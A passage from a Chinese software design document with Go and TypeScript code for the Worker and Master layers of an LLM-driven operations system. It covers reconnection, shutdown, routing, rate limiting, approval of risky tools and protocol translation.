- 长任务执行期间的心跳由独立的 goroutine 保障，不受阻塞

##### 4.2.2.10 抖动重连（解决 #10）

```go
// internal/connection/reconnect.go
func (c *WSClient) reconnectLoop(ctx context.Context) {
    baseDelay := c.config.Reconnect.BaseDelay  // 1s
    maxDelay  := c.config.Reconnect.MaxDelay   // 60s
    
    attempt := 0
    for {
        select {
        case <-ctx.Done():
            return
        default:
        }
        
        err := c.connect(ctx)
        if err == nil {
            attempt = 0   // 连接成功重置计数
            c.handleSession(ctx)
        }
        
        // jitter = random[0.5, 1.5) * baseDelay * 2^attempt
        delay := float64(baseDelay) * math.Pow(2, float64(attempt))
        if delay > float64(maxDelay) {
            delay = float64(maxDelay)
        }
        jitter := delay * (0.5 + rand.Float64())  // [0.5, 1.5) 倍抖动
        
        time.Sleep(time.Duration(jitter))
        attempt++
    }
}
```

**关键设计**：
- 指数退避（1s → 2s → 4s → 8s → ... → 60s max）
- 每次重连加入 **50% 随机抖动**，避免重连风暴
- 连接成功后重置退避计数，保证稳态下快速重连

##### 4.2.2.11 优雅关闭（解决 #11）

```go
// cmd/worker/main.go
func main() {
    sigCh := make(chan os.Signal, 1)
    signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
    
    executor := executor.NewExecutor(registry, config.MaxConcurrent)
    client := connection.NewWSClient(config, executor)
    
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    
    go client.Run(ctx)
    
    sig := <-sigCh
    log.Printf("received signal %v, shutting down gracefully...", sig)
    cancel()        // 通知所有正在执行的工具 context 取消
    
    // 等待正在执行的工具完成（最长 30 秒）
    done := make(chan struct{})
    go func() {
        executor.WaitForDrain()  // 等待所有执行中的工具返回
        close(done)
    }()
    
    select {
    case <-done:
        log.Printf("all tools completed, goodbye")
    case <-time.After(30 * time.Second):
        log.Printf("graceful shutdown timeout, forcing exit")
    }
    
    client.Close()
}
```

**关闭顺序**：
1. 收到 SIGTERM/SIGINT
2. 停止接受新 request（先回 NAK + `SHUTTING_DOWN`）
3. 取消正在执行的工具的 context（工具收到 `context.Canceled` 自行清理）
4. 等待 executor 排空（最多 30 秒）
5. 关闭 WebSocket 连接
6. 退出进程

##### 4.2.2.12 工具风险等级（解决 #12）

每个工具注册时声明 `RiskLevel`，作为 `capability.advertise` 的一部分上报给 Master：

| 等级 | 含义 | 例子 | Master 策略 |
|------|------|------|-----------|
| `readonly` | 只读查询，无副作用 | `ping.icmp`, `disk.usage`, `service.status`, `process.list` | 直通，不需审批 |
| `write` | 有状态变更 | `service.restart`, `service.stop`, `process.kill` | 需要审批 |
| `dangerous` | 高危操作 | `exec.run`, `disk.cleanup` | 需要审批 + 二次确认 |

Master 的 `interceptor.ts` 根据 Worker 上报的 `RiskLevel` 自动决定是否需要审批，不再硬编码。

#### 4.2.3 重构后的 Worker 目录

```
worker/
├── cmd/worker/
│   └── main.go                        # 入口：信号处理、优雅关闭、启动所有模块
├── internal/
│   ├── config/
│   │   ├── config.go                  # 配置结构体定义与加载（yaml 解析）
│   │   └── config_test.go
│   ├── connection/
│   │   ├── client.go                  # WebSocket 客户端：连接、重连、会话管理
│   │   ├── envelope.go               # 信封编解码（JSON 序列化/反序列化）
│   │   ├── auth.go                    # cluster token 认证
│   │   ├── dedup.go                   # msg_id 去重缓存（FIFO 上限 1024 条）
│   │   ├── heartbeat.go              # 独立 goroutine 的心跳保活（WebSocket Ping/Pong）
│   │   └── reconnect.go              # 抖动指数退避重连
│   ├── registry/
│   │   ├── registry.go               # 工具注册中心：action → Tool 映射
│   │   └── registry_test.go
│   ├── executor/
│   │   ├── sandbox.go                 # 执行沙箱：并发控制信号量、强制超时、panic recover
│   │   ├── sandbox_test.go
│   │   └── result.go                  # ToolResult 定义
│   ├── safety/
│   │   ├── limiter.go                 # 输出截断（1MB data / 100KB error.raw）
│   │   ├── filter.go                  # 敏感信息过滤（密码、密钥等）
│   │   ├── path.go                    # 路径消毒（防路径遍历）
│   │   └── limiter_test.go
│   ├── tools/                         # 每个工具一对文件（.go + _test.go）
│   │   ├── ping.go                    # ping.icmp：ICMP/TCP ping，超时 10s，readonly
│   │   ├── ping_test.go
│   │   ├── service.go                 # service.*：启停查，超时 30s，write / readonly
│   │   ├── service_test.go
│   │   ├── process.go                 # process.*：进程操作，超时 10s，write / readonly
│   │   ├── process_test.go
│   │   ├── disk.go                    # disk.*：磁盘工具，超时 5s，readonly
│   │   ├── disk_test.go
│   │   ├── log.go                     # log.tail：日志读取，超时 15s，readonly
│   │   ├── log_test.go
│   │   ├── exec.go                    # exec.run：命令执行，超时 60s，dangerous
│   │   └── exec_test.go
│   └── reporter/
│       └── reporter.go                # 状态上报：定期发送节点健康、负载、资源概览
├── pkg/
│   └── envelope/                      # 协议类型定义（通用，可导出给测试和外部工具）
│       ├── envelope.go
│       └── envelope_test.go
├── worker.yaml                        # Worker 配置文件
├── go.mod
└── go.sum
```

#### 4.2.4 工具注册示例

```go
// internal/tools/ping.go
func init() {
    registry.Global().Register(registry.Tool{
        Action:       "ping.icmp",
        Timeout:      10 * time.Second,
        IsIdempotent: true,
        RiskLevel:    "readonly",
        Execute:      ExecutePing,
    })
}

func ExecutePing(ctx context.Context, params map[string]interface{}) executor.ToolResult {
    target, _ := params["target"].(string)
    if target == "" {
        return executor.ToolResult{
            Success: false,
            Error:   &executor.ToolError{Code: "INVALID_PARAMS", Message: "target is required"},
        }
    }
    
    // 真实 ICMP ping，通过 context 控制超时
    err := probeICMP(ctx, target)
    if err != nil {
        return executor.ToolResult{
            Success: false,
            Error:   &executor.ToolError{Code: "PING_FAILED", Message: err.Error(), Raw: err.Error()},
        }
    }
    return executor.ToolResult{
        Success: true,
        Data:    map[string]interface{}{"target": target, "reachable": true},
    }
}
```

#### 4.2.5 Worker 状态机

```
         ┌──────────┐
         │  Init    │  读取配置、注册工具、初始化组件
         └────┬─────┘
              │ 成功
              ▼
         ┌──────────┐
         │  Auth    │  向 Master 发送 token 认证
         └────┬─────┘
      ┌───────┴───────┐
      │ 成功          │ 失败
      ▼               ▼
  ┌─────────┐  ┌──────────────┐
  │  Online │  │  Reconnecting│ ←── 指数退避重连 + 抖动
  └────┬────┘  └──────────────┘
       │ 收到 request          ↑
       ▼                       │
  ┌─────────┐       重新连接成功
  │  Execute│
  └────┬────┘
       │ 完成
       ▼
  ┌─────────┐
  │  Report │  回传结果
  └────┬────┘
       │
       ▼
  ┌─────────┐     ┌──────────┐
  │ Online  │ ←── │  Drain   │ ← SIGTERM
  └─────────┘     └────┬─────┘
                        │ 排空完成
                        ▼
                   ┌──────────┐
                   │  Exit    │
                   └──────────┘
```

### 4.3 Master 层（TypeScript）— 调度与安全中枢

**定位**：承上启下的核心枢纽。向上对接 Brain（REST），向下管理 Worker（WebSocket），负责连接管理、指令路由、安全审批、结果摘要、协议适配。

**适配职责**：
- **对 Brain 侧**：接收经由 `ParamFilter` 消毒过的指令，不做重复过滤但做完整性校验；回传响应时透传 Worker 的截断标记和错误信息，不丢失关键字段
- **对 Worker 侧**：处理 Worker 的能力声明和负载上报，根据风险等级自动决定审批策略；适配 Worker 的 `truncated` 标记、`progress` 进度事件、分片重组

#### 4.3.1 Master 核心问题分析

| # | 问题 | 场景 | 后果 |
|---|------|------|------|
| 1 | **Worker 连接风暴** | Master 宕机恢复后，数百个 Worker 同时重连 | WS 服务端 accept 队列溢出，部分 Worker 被 RST |
| 2 | **连接泄漏** | Worker 进程被 kill -9，TCP 连接处于 CLOSE_WAIT 状态 | 连接对象残留，Worker 注册表出现"僵尸节点" |
| 3 | **负载盲路由** | 路由时只看 capability，不看 Worker 当前并发数 | 请求全部发到同一个空闲 Worker，其他 Worker 闲置 |
| 4 | **Tracker 内存泄漏** | Brain 发送请求后断开，pending 条目无人认领 | 内存持续上涨，tracker 中积压大量孤儿条目 |
| 5 | **分片重组缓冲区泄漏** | 分片收不齐（如丢包），缓冲区永远不释放 | 内存泄漏，每个丢失的分片占用 ~1MB 直到 Master 重启 |
| 6 | **优先级队列饥饿** | 低优先级请求持续被高优先级请求插队 | 低优先级请求永远无法被执行 |
| 7 | **审批过期** | 审批耗时 2 分钟，期间目标 Worker 已离线 | 审批通过后路由失败，用户白等了 |
| 8 | **广播风暴** | `target: broadcast` 指令下发给 1000 个 Worker，瞬时收到 1000 个响应 | Master 响应处理 OOM |
| 9 | **Brain→Worker 协议转换鸿沟** | Brain 发 REST（HTTP 请求），Master 转 WS 发给 Worker，响应反向转换 | 字段丢失（如 truncated、progress）、格式不一致 |
| 10 | **摘要层信息丢失** | summarizer 提取摘要时过滤掉 error.raw，Brain 拿到"成功"但实际有截断 | Brain 基于不完整信息做决策 |
| 11 | **Worker 能力变更** | Worker 更新版本后新增了工具，但 Master 仍用旧能力表路由 | 新工具永远无法被路由到 |
| 12 | **REST API 无防护** | Brain API 端点暴露在局域网，任何进程可调用 | 未授权指令注入 |
| 13 | **心跳超时一刀切** | 不同 Worker 网络状况不同，统一的心跳超时导致频繁误判 | 网络延迟稍高的 Worker 被反复标记离线 |
| 14 | **Master 自身无 HA** | Master 进程崩溃，全部 Worker 失联，全部 pending 请求丢失 | 单点故障，系统整体不可用 |
| 15 | **版本兼容性矩阵缺失** | 旧版 Worker 连新版 Master，协议不兼容 | 连接失败但错误信息不明确 |

#### 4.3.2 解决方案

##### 4.3.2.1 Worker 连接限流（解决 #1）

```typescript
// src/server/ws-server.ts
import { Server as WSServer } from "ws";

class RateLimiter {
  private tokens: number;
  private lastRefill: number;
  
  constructor(private maxPerSecond: number) {
    this.tokens = maxPerSecond;
    this.lastRefill = Date.now();
  }
  
  tryAcquire(): boolean {
    this.refill();
    if (this.tokens > 0) {
      this.tokens--;
      return true;
    }
    return false;
  }
  
  private refill() {
    const now = Date.now();
    const elapsed = (now - this.lastRefill) / 1000;
    this.tokens = Math.min(this.maxPerSecond, this.tokens + elapsed * this.maxPerSecond);
    this.lastRefill = now;
  }
}

class WSServer {
  private connRateLimiter = new RateLimiter(50);  // 每秒最多接受 50 个新连接
  
  onConnection(req: IncomingMessage, socket: Duplex, head: Buffer) {
    if (!this.connRateLimiter.tryAcquire()) {
      socket.destroy();  // 超过限流直接拒绝
      logger.warn("connection rate limit exceeded, rejecting");
      return;
    }
    // ... 正常认证流程
  }
}
```

**规则**：
- 默认每秒最多接受 50 个新连接（可配置）
- 超过限流直接关闭 TCP 连接，不占用 WS 握手资源
- Worker 端通过重连抖动自然会分散重连时间

##### 4.3.2.2 僵尸节点检测（解决 #2）

```typescript
// src/server/ws-server.ts

interface WorkerConnection {
  ws: WebSocket;
  workerId: string;
  lastPong: number;
  connectedAt: number;
}

class ConnectionManager {
  private connections = new Map<string, WorkerConnection>();
  private readonly PONG_TIMEOUT = 60_000;  // 60s 无 pong 视为死连接
  
  onPong(workerId: string) {
    const conn = this.connections.get(workerId);
    if (conn) {
      conn.lastPong = Date.now();
    }
  }
  
  reapZombies(): number {
    const now = Date.now();
    let reaped = 0;
    for (const [workerId, conn] of this.connections.entries()) {
      if (now - conn.lastPong > this.PONG_TIMEOUT) {
        conn.ws.terminate();    // 强制关闭 TCP
        this.connections.delete(workerId);
        this.registry.markOffline(workerId, "zombie");
        reaped++;
      }
    }
    return reaped;
  }
}

// 每 30 秒执行一次僵尸节点回收
setInterval(() => {
  const count = connectionManager.reapZombies();
  if (count > 0) {
    logger.warn("zombie connections reaped", { count });
  }
}, 30_000);
```

**结合 Worker 端的心跳机制**：
- Worker 每隔 15s 发一次 WebSocket Ping 帧
- Master 收到 Pong 更新 `lastPong`
- 60s 未收到 Pong → 判定为僵尸节点，强制 terminate + 从注册表移除
- 对比 Worker 的 `reconnect.maxDelay = 60s`，Master 的超时恰好覆盖 Worker 的最大重连间隔，防止频繁误判

##### 4.3.2.3 负载感知路由（解决 #3）

```typescript
// src/orchestrator/router.ts

interface WorkerNode {
  workerId: string;
  actions: string[];
  maxConcurrent: number;     // 从 capability 获取
  currentLoad: number;       // 实时更新：当前执行中的工具数
  lastHeartbeat: number;
  riskLevels: Map<string, "readonly" | "write" | "dangerous">;
}

class Router {
  route(action: string, riskLevel?: string, preferWorkerId?: string): WorkerNode | null {
    // 1. 过滤出具备该 action 能力的 Worker
    const candidates = this.registry.getOnlineWorkers().filter(w => 
      w.actions.includes(action)
    );
    
    if (candidates.length === 0) {
      return null;
    }
    
    // 2. 如果 Brain 指定了 preferWorkerId 且该 Worker 在线且有该能力
    if (preferWorkerId) {
      const preferred = candidates.find(w => w.workerId === preferWorkerId);
      if (preferred && preferred.currentLoad < preferred.maxConcurrent) {
        return preferred;
      }
    }
    
    // 3. 负载最低优先（least-loaded）
    candidates.sort((a, b) => 
      (a.currentLoad / a.maxConcurrent) - (b.currentLoad / b.maxConcurrent)
    );
    
    const selected = candidates[0];
    if (selected && selected.currentLoad >= selected.maxConcurrent) {
      return null;  // 所有 Worker 都满载
    }
    
    return selected;
  }
  
  routeBroadcast(action: string): WorkerNode[] {
    // 广播路由：返回所有具备该能力的在线 Worker
    return this.registry.getOnlineWorkers().filter(w => 
      w.actions.includes(action) && w.currentLoad < w.maxConcurrent
    );
  }
}
```

##### 4.3.2.4 Tracker 防泄漏（解决 #4）

```typescript
// src/orchestrator/tracker.ts

interface PendingEntry {
  envelope: Envelope;
  targetWorker: string;
  sentAt: number;
  ttl: number;
  retryCount: number;
}

class Tracker {
  private pending = new Map<string, PendingEntry>();
  private readonly MAX_PENDING = 10_000;      // 最大 pending 数
  private readonly ORPHAN_TTL = 300_000;      // 孤儿请求 5 分钟过期
  
  track(msgId: string, entry: PendingEntry): boolean {
    if (this.pending.size >= this.MAX_PENDING) {
      logger.error("tracker full, rejecting request", { msgId });
      return false;  // 拒绝新请求，返回给 Brain "MASTER_OVERLOAD"
    }
    this.pending.set(msgId, entry);
    return true;
  }
  
  resolve(msgId: string, response: Envelope): void {
    this.pending.delete(msgId);
  }
  
  // 定期清理孤儿请求（Brain 发请求后断连的场景）
  reapOrphans(): number {
    const now = Date.now();
    let reaped = 0;
    for (const [msgId, entry] of this.pending.entries()) {
      if (now - entry.sentAt > entry.ttl * 1000) {
        this.pending.delete(msgId);
        reaped++;
      }
    }
    return reaped;
  }
  
  // 批量重试（连接恢复后）
  getPendingForWorker(workerId: string): PendingEntry[] {
    return Array.from(this.pending.values())
      .filter(e => e.targetWorker === workerId);
  }
}

// 每 30 秒清理孤儿
setInterval(() => tracker.reapOrphans(), 30_000);
```

**Master 重启后的丢失处理**：
- pending 条目不持久化（权衡：持久化带来的复杂度和收益不成正比）
- Master 重启后，Worker 重连并重新注册，Brain 通过超时重发未完成的请求
- 这是"所有问题显式化"的体现：接受 Master 重启会丢 pending 的事实，通过上下游的重试机制补偿

##### 4.3.2.5 分片重组超时清理（解决 #5）

```typescript
// src/orchestrator/tracker.ts (分片重组部分)

interface ChunkGroup {
  traceId: string;
  chunks: Map<number, string>;  // chunkIndex → content
  totalChunks: number;
  firstChunkAt: number;
  timeout: number;              // 30 秒超时
  resolve: (data: string) => void;
  reject: (err: Error) => void;
}

class ChunkAssembler {
  private groups = new Map<string, ChunkGroup>();
  private readonly CHUNK_TIMEOUT = 30_000;  // 30s
  private readonly MAX_GROUPS = 500;        // 最大同时重组数
  
  addChunk(traceId: string, index: number, total: number, content: string): string | null {
    let group = this.groups.get(traceId);
    if (!group) {
      if (this.groups.size >= this.MAX_GROUPS) {
        logger.error("too many chunk groups, discarding", { traceId });
        return null;
      }
      group = {
        traceId, chunks: new Map(), totalChunks: total,
        firstChunkAt: Date.now(), timeout: this.CHUNK_TIMEOUT,
        resolve: null!, reject: null!,
      };
      this.groups.set(traceId, group);
    }
    
    group.chunks.set(index, content);
    
    // 收齐全部块
    if (group.chunks.size === group.totalChunks) {
      const fullData = Array.from({ length: group.totalChunks })
        .map((_, i) => group!.chunks.get(i) || "")
        .join("");
      this.groups.delete(traceId);
      return fullData;
    }
    
    return null;  // 尚未收齐
  }
  
  // 每 15 秒清理超时分片组
  reapExpired(): number {
    const now = Date.now();
    let reaped = 0;
    for (const [traceId, group] of this.groups.entries()) {
      if (now - group.firstChunkAt > group.timeout) {
        this.groups.delete(traceId);
        reaped++;
      }
    }
    return reaped;
  }
}
```

##### 4.3.2.6 优先级队列防饥饿（解决 #6）

```typescript
// src/orchestrator/priority-queue.ts

interface QueueItem {
  envelope: Envelope;
  enqueuedAt: number;
  priority: number;   // 0=常规 1=重要 2=紧急
}

class PriorityQueue {
  private queues: QueueItem[][] = [[], [], []];  // [P0, P1, P2]
  private agingFactor = 0.1;   // 每等待 1 秒提升 0.1 优先级
  
  enqueue(item: QueueItem): void {
    this.queues[item.priority].push(item);
  }
  
  dequeue(): QueueItem | null {
    // 高优先级优先，但考虑老化
    for (let p = 2; p >= 0; p--) {
      if (this.queues[p].length === 0) continue;
      
      // P0 永远先执行（紧急）
      if (p === 2) return this.queues[p].shift()!;
      
      // P1 / P0 考虑老化：等待时间超过 60 秒的，提升一级优先级
      // 避免常规请求被紧急请求无限阻塞
      const now = Date.now();
      const agedItem = this.queues[p].find(item => 
        (now - item.enqueuedAt) / 1000 * this.agingFactor >= 1
      );
      
      if (agedItem) {
        // 从当前队列移除
        const idx = this.queues[p].indexOf(agedItem);
        this.queues[p].splice(idx, 1);
        return agedItem;
      }
      
      return this.queues[p].shift()!;
    }
    
    return null;
  }
  
  size(): number {
    return this.queues.reduce((sum, q) => sum + q.length, 0);
  }
}
```

**老化策略**：
- 常规请求（P0）等待超过 **60 秒** → 自动提升到 P1
- 重要请求（P1）等待超过 **120 秒** → 自动提升到 P2
- 紧急请求（P2）不会被降级
- 防止低优先级请求被无限饥饿

##### 4.3.2.7 审批过期感知（解决 #7）

```typescript
// src/security/approver.ts

interface ApprovalRequest {
  id: string;
  envelope: Envelope;
  targetWorkerId: string;
  createdAt: number;
  expiresAt: number;     // 审批过期时间
  status: "pending" | "approved" | "rejected" | "expired";
}

class Approver {
  private activeApprovals = new Map<string, ApprovalRequest>();
  private readonly APPROVAL_TIMEOUT = 300_000;   // 5 分钟（Worker 可能变化）
  
  requestApproval(envelope: Envelope, targetWorkerId: string): ApprovalRequest {
    const req: ApprovalRequest = {
      id: generateMsgId(),
      envelope,
      targetWorkerId,
      createdAt: Date.now(),
      expiresAt: Date.now() + this.APPROVAL_TIMEOUT,
      status: "pending",
    };
    
    this.activeApprovals.set(req.id, req);
    
    // 发送审批通知（飞书 / 控制台）
    this.notify(req);
    
    // 过期自动取消
    setTimeout(() => {
      const current = this.activeApprovals.get(req.id);
      if (current && current.status === "pending") {
        current.status = "expired";
        // 检查目标 Worker 是否还在线
        const workerOnline = this.registry.isOnline(targetWorkerId);
        this.activeApprovals.delete(req.id);
        
        // 过期后自动拒绝并通知 Brain
        this.rejectAndNotify(req, `审批超时，Worker ${targetWorkerId} 在线状态: ${workerOnline}`);
      }
    }, this.APPROVAL_TIMEOUT);
    
    return req;
  }
  
  approve(approvalId: string): { success: boolean; workerStillOnline: boolean } {
    const req = this.activeApprovals.get(approvalId);
    if (!req || req.status !== "pending") {
      return { success: false, workerStillOnline: false };
    }
    
    // 检查目标 Worker 审批期间是否还在线
    const workerOnline = this.registry.isOnline(req.targetWorkerId);
    if (!workerOnline) {
      req.status = "expired";
      this.activeApprovals.delete(approvalId);
      return { success: false, workerStillOnline: false };
    }
    
    req.status = "approved";
    this.activeApprovals.delete(approvalId);
    return { success: true, workerStillOnline: true };
  }
}
```

**审批通过时 Worker 已离线**：
1. `approve()` 返回 `{ success: false, workerStillOnline: false }`
2. approver 自动尝试路由到其他具备相同能力的 Worker
3. 无其他可用 Worker → 返回 Brain `NO_AVAILABLE_WORKER`
4. Brain Reflector 判断是否需要人工介入

##### 4.3.2.8 广播限流（解决 #8）

```typescript
// src/orchestrator/router.ts (广播场景)

async routeAndCollect(action: string, params: any, timeout = 10_000): Promise<Map<string, Envelope>> {
  const workers = this.routeBroadcast(action);
  
  if (workers.length > 100) {
    logger.warn("large broadcast", { action, workerCount: workers.length });
  }
  
  const results = new Map<string, Envelope>();
  const promises = workers.map(async (worker) => {
    try {
      const response = await this.sendToWorker(worker.workerId, { action, params, timeout });
      results.set(worker.workerId, response);
    } catch (err) {
      results.set(worker.workerId, { status: "failure", error: { code: "WORKER_NO_RESPONSE" } });
    }
  });
  
  await Promise.race([
    Promise.all(promises),
    new Promise(resolve => setTimeout(resolve, timeout))  // 总超时兜底
  ]);
  
  return results;
}
```

**规则**：
- 广播请求设总超时（默认 10 秒）
- 超时后已经收到的结果正常返回，未收到的标记为 `WORKER_NO_RESPONSE`
- 超过 100 个 Worker 的广播记录告警日志
- Master 永不汇总广播响应 —— 将原始 `Map<workerId, Envelope>` 直接返回 Brain，Brain 自行分析

##### 4.3.2.9 Brain↔Worker 协议转换（解决 #9）

Master 是协议的"翻译层"，在 Brain（REST JSON）和 Worker（WS Envelope）之间做适配。**核心规则：转发时不丢失任何字段，尤其是错误信息和截断标记。**

```typescript
// src/server/brain-api.ts

// Brain → Master 的 REST 请求体
interface BrainRequest {
  action: string;
  params: Record<string, any>;
  trace_id: string;
  priority?: number;
  ttl_seconds?: number;
  target_worker_id?: string;
}

// Master → Brain 的 REST 响应体
interface BrainResponse {
  trace_id: string;
  msg_id: string;
  status: "success" | "failure" | "pending";
  action: string;
  data: any;
  truncated?: boolean;          // 透传 Worker 截断标记
  truncated_at?: number;        // 透传原始大小
  progress?: {                  // 透传长时间任务进度
    percent: number;
    message: string;
  };
  error?: {
    code: string;
    message: string;
    raw?: string;               // 透传原始错误，不截断不美化
  };
}

// src/server/brain-api.ts — 请求转换
function brainRequestToEnvelope(req: BrainRequest): Envelope {
  // Brain 的 ParamFilter 已完成参数消毒，Master 不再重复过滤
  // 但做完整性校验
  if (!req.trace_id) {
    throw new Error("MISSING_TRACE_ID");
  }
  if (!req.action) {
    throw new Error("MISSING_ACTION");
  }
  
  return {
    proto_version: "1.0",
    trace_id: req.trace_id,
    msg_id: generateMsgId(),
    msg_type: "request",
    timestamp: Math.floor(Date.now() / 1000),
    source: "brain",
    source_id: "brain",
    target: "worker",
    target_id: req.target_worker_id || "auto",
    correlation_id: "",
    priority: req.priority ?? 0,
    ttl_seconds: req.ttl_seconds ?? 30,
    payload: {
      action: req.action,
      params: req.params,
      status: "pending",
      data: {},
      progress: undefined,
      error: undefined,
    },
  };
}

// src/server/brain-api.ts — 响应转换（反向）
function workerResponseToBrain(workerResp: Envelope): BrainResponse {
  const payload = workerResp.payload;
  
  const response: BrainResponse = {
    trace_id: workerResp.trace_id,
    msg_id: workerResp.msg_id,
    status: payload.status as "success" | "failure" | "pending",
    action: payload.action,
    data: payload.data,
  };
  
  // 关键：透传截断信息，不丢失
  if (payload.truncated) {
    response.truncated = true;
    response.truncated_at = payload.truncated_at;
  }
  
  // 关键：透传进度信息
  if (payload.progress) {
    response.progress = payload.progress;
  }
  
  // 关键：透传原始错误，不美化
  if (payload.error) {
    response.error = {
      code: payload.error.code,
      message: payload.error.message,
      raw: payload.error.raw,     // 透传给 Brain
    };
  }
  
  return response;
}
```

##### 4.3.2.10 摘要层信息保全（解决 #10）

summarizer 做摘要的目的是减少 Brain LLM 的 token 消耗，但绝不能过滤掉关键信息。

```typescript
// src/orchestrator/summarizer.ts

interface SummarizedResult {
  trace_id: string;
  action: string;
  status: "success" | "failure" | "pending";
  
  // 摘要字段（减少 token 消耗）
  summary: string;              // 一句话摘要
  key_metrics: Record<string, any>;  // 关键数值提取
  
  // 原始数据字段（确保不丢失关键信息）
  has_truncation: boolean;      // 是否有截断
  has_error: boolean;           // 是否有错误
  error_code?: string;          // 错误码（有则必填）
  error_message?: string;       // 错误消息（有则必填）
  progress?: { percent: number; message: string };
  
  // 原始完整数据（可选，LLM 按需读取）
  // 大型数据不嵌入响应体，通过 trace_id 索引到日志
}

class Summarizer {
  summarize(response: BrainResponse): SummarizedResult {
    const result: SummarizedResult = {
      trace_id: response.trace_id,
      action: response.action,
      status: response.status,
      summary: "",
      key_metrics: {},
      has_truncation: response.truncated || false,
      has_error: response.status === "failure",
    };
    
    // 摘要生成逻辑
    if (response.status === "success") {
      if (response.action === "disk.usage") {
        const usage = response.data?.usage;
        result.summary = `磁盘使用率: ${usage}%`;
        result.key_metrics = { usage_percent: usage };
      } else if (response.action === "service.status") {
        result.summary = `服务状态: ${response.data?.status}`;
        result.key_metrics = { service_status: response.data?.status };
      } else {
        result.summary = `操作成功完成`;
      }
    }
    
    // 错误信息强制保留，不进摘要
    if (response.error) {
      result.error_code = response.error.code;
      result.error_message = response.error.message;
      result.summary = `操作失败: ${response.error.code} - ${response.error.message}`;
    }
    
    // 截断标记强制保留
    if (response.truncated) {
      result.summary += ` [输出截断, 原始大小: ${response.truncated_at} 字节]`;
    }
    
    return result;
  }
}
```

**关键规则**：
- `error_code` 和 `error_message` 必须在摘要中保留，不进 summary 文本（防止 LLM 误解）
- `truncated` 标记必须出现在摘要里
- summary 本身被设计为 LLM 友好的短文本，嵌入到 prompt 中减少 token

##### 4.3.2.11 Worker 能力动态刷新（解决 #11）

```typescript
// src/store/registry.ts

interface WorkerRegistration {
  workerId: string;
  actions: Set<string>;
  riskLevels: Map<string, "readonly" | "write" | "dangerous">;
  timeout: Map<string, number>;       // action → 超时（毫秒）
  maxConcurrent: number;
  connectedAt: number;
  version: string;
}

class Registry {
  private workers = new Map<string, WorkerRegistration>();
  
  register(workerId: string, caps: CapabilityAdvertise): void {
    const existing = this.workers.get(workerId);
    if (existing) {
      // 能力变更检测
      const oldActions = [...existing.actions].sort().join(",");
      const newActions = caps.actions.sort().join(",");
      if (oldActions !== newActions) {
        logger.info("worker capabilities changed", {
          workerId,
          added: caps.actions.filter(a => !existing.actions.has(a)),
          removed: [...existing.actions].filter(a => !caps.actions.includes(a)),
        });
      }
    }
    
    this.workers.set(workerId, {
      workerId,
      actions: new Set(caps.actions),
      riskLevels: new Map(Object.entries(caps.risk_levels || {})),
      timeout: new Map(Object.entries(caps.timeouts || {})),
      maxConcurrent: caps.max_concurrent_tools ?? 5,
      connectedAt: Date.now(),
      version: caps.worker_version,
    });
  }
  
  updateLoad(workerId: string, currentLoad: number): void {
    const worker = this.workers.get(workerId);
    if (worker) {
      // 这里只更新负载，不触发其他逻辑
      // 负载数据用于 router 做决策
    }
  }
}
```

**能力变更触发时机**：
- 每个 Worker 在连接建立时发送 `capability.advertise`
- 连接期间 Worker 能力不变，所以不需要定期刷新
- 重连时重新上报，Registry 自动覆盖更新
- Master 记录变更日志供审计

##### 4.3.2.12 Brain API 认证与限流（解决 #12）

```typescript
// src/server/brain-api.ts

import rateLimit from "express-rate-limit";

const brainApiLimiter = rateLimit({
  windowMs: 60 * 1000,     // 1 分钟窗口
  max: 120,                 // 最多 120 次请求/分钟
  message: { status: "failure", error: { code: "RATE_LIMITED", message: "too many requests" } },
});

// Brain API 路由
router.post("/api/v1/execute", 
  authenticate,         // 校验 cluster token
  brainApiLimiter,       // 限流
  validateBrainRequest,  // 校验 trace_id / action
  async (req, res) => {
    // ... 处理流程
  }
);

// 健康检查端点（不限流，不认证）
router.get("/health", (req, res) => {
  res.json({
    status: "ok",
    uptime: process.uptime(),
    workers: {
      online: registry.onlineCount(),
      total_actions: registry.totalActions(),
    },
    pending: tracker.pendingCount(),
  });
});
```

**认证机制**：
- Brain 请求携带 `Authorization: Bearer <cluster_token>`
- 与 Worker 使用相同的 cluster token（简化密钥管理）
- token 校验失败 → 401 + 明确错误信息

##### 4.3.2.13 心跳超时个性化（解决 #13）

```typescript
// src/store/registry.ts (补充)

interface HeartbeatConfig {
  interval: number;     // 心跳间隔（秒），从 Worker 的 capability 中获取
  missTolerance: number;// 容忍丢失次数
}

// Master 端的超时 = Worker 端间隔 × 容忍次数
// 默认: 15s × 3 = 45s 无心跳判离线
function calculateHeartbeatTimeout(workerInterval: number): number {
  return workerInterval * 3;   // 容忍连续丢 3 次心跳
}
```

**规则**：
- 每个 Worker 的 `capability.advertise` 中携带 `heartbeat_interval`
- Master 据此动态计算该 Worker 的心跳超时时间（`interval × 3`）
- 网络环境差的 Worker 可配置更长的心跳间隔，减少误判

#### 4.3.3 Master 与 Worker / Brain 的适配汇总

##### 与 Worker 的适配

| Worker 输出 | Master 处理 | 透传规则 |
|------------|-----------|---------|
| `truncated: true` | 记录日志，添加 `_truncation_notice` | 强制透传给 Brain |
| `error.raw` | 不过滤不截断 | 强制透传给 Brain |
| `progress` 事件 | 缓存最新进度，响应 Brain 轮询 | 透传最新状态 |
| 能力声明 | 注册到 Registry，变更时记录审计 | 用于路由决策 |
| 负载上报 | 更新 `currentLoad` | 用于负载均衡路由 |

##### 与 Brain 的适配

| Brain 输入 | Master 校验 | 拒绝条件 |
|-----------|-----------|---------|
| `trace_id` | 必须存在且非空 | `MISSING_TRACE_ID` |
| `action` | 必须存在 | `MISSING_ACTION` |
| `params` | 不做参数消毒（Worker 端做） | 不拒绝（信任 Brain 的 ParamFilter） |
| `priority` | 范围 [0, 2]，非法则默认 0 | 不拒绝，取默认值 |
| `ttl_seconds` | 范围 [1, 300]，非法则默认 30 | 不拒绝，取默认值 |

#### 4.3.4 重构后的 Master 目录

```
master/
├── src/
│   ├── index.ts                          # 入口：启动 HTTP + WS 服务，初始化各模块
│   ├── server/
│   │   ├── ws-server.ts                  # Worker WebSocket 服务端
│   │   │   ├── 连接限流（50/s）
│   │   │   ├── token 认证
│   │   │   ├── 版本协商
│   │   │   ├── 心跳检测（Ping/Pong）
│   │   │   └── 僵尸节点回收（30s 定时）
│   │   ├── brain-api.ts                  # Brain REST API
│   │   │   ├── POST /api/v1/execute（限流、认证、校验、转发）
│   │   │   ├── GET /api/v1/result/:msgId（轮询长时间任务）
│   │   │   └── 请求/响应协议转换（不丢字段）
